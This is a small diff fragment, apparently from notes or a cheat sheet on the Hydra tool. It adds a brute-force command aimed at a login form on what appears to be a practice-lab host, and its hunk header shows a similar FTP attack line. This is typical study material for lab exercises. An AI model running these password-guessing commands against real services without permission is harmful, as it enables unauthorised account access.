@@ -135,6 +135,9 @@ hydra -l ignite -P pass.txt 192.168.1.141 ftp
 
 
 
+-- Examples --
+
+$ hydra -l admin -P passlist.txt www.onlineshop.thm http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
 
 
 
